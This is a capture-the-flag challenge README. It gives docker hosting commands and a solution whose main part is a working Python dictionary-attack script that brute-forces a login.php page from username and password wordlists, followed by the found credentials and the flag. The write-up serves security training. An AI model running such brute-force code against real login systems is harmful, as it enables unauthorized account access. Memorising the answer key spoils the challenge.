# Bruteforce

Hosting:

```bash
docker build -t bruteforce .
docker run -p 8080:80 bruteforce
```

Solution:

1. Navigate to `<url>`/admin
2. Run following script:

   ```py
   import requests

   base_url = "http://192.168.39.6:5080/login.php?username={}&password={}"

   username = []
   password = []

   with open("./challenge_files/passwords.txt", "r", encoding="UTF-8") as file:
       for line in file:
           param = line.strip()
           password.append(param)

   with open("./challenge_files/usernames.txt", "r", encoding="UTF-8") as file:
       for line in file:
           param = line.strip()
           username.append(param)


   def dict_attack():
       for user in username:
           for p in password:
               url = base_url.format(user, p)
               response = requests.get(url)

               if response.status_code != 401:
                   print(f"Successful URL: {url}")
                   print("Response:")
                   print(response.text)
                   return
               else:
                   continue


   dict_attack()

   ```

3. Username: `admin` Password: `trinity` (From dictionary)

Flag: `glitch{trinity}`
